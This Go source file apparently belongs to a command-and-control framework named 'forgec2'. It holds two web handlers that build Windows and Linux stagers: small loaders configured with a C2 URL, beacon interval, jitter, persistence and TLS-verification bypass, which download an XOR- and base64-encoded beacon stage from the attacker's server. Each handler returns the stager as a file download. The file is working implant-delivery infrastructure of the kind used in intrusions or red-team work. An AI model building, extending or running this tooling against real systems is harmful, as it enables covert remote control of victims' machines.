package server

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleGenerateStager(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener is required")
		return
	}

	if !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return
		}
		form.C2URL = resolved.C2URL
		form.Protocol = resolved.Protocol
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	proto := form.Protocol
	if proto == "" {
		proto = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      proto,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage.exe",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the stage (full beacon EXE, XOR-encoded, base64-encoded)
	_, xorKeyHex, err := payload.GenerateStage(cfg, agentsDir)
	if err != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
		return
	}

	// Use the C2 server address for the stager to download from
	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename // use user's desired filename for stager

	// Build the stager with C2URL and XORKey injected
	stagerPath, err := payload.GenerateStager(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", stagerPath)
		respondError(c, http.StatusInternalServerError, "Generated stager not found — try regenerating")
		return
	}

	s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "success", "", stagerPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}

func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener is required")
		return
	}

	if !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return
		}
		form.C2URL = resolved.C2URL
		form.Protocol = resolved.Protocol
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	proto := form.Protocol
	if proto == "" {
		proto = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      proto,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	_, xorKeyHex, err := payload.GenerateStageForOS(cfg, agentsDir, "linux")
	if err != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
		return
	}

	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename

	stagerPath, err := payload.GenerateStagerLinux(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Stager generation"))
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", stagerPath)
		respondError(c, http.StatusInternalServerError, "Generated stager not found — try regenerating")
		return
	}

	s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "success", "", stagerPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}
